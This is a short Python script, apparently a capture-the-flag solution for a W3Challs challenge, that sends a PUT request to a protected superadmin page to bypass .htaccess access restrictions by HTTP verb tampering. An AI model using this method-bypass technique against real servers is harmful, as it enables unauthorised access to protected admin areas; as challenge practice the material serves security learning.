from requests import *

url = 'http://htaccess.hax.w3challs.com/superadmin/index.php'
r = put(url)
print(r.text)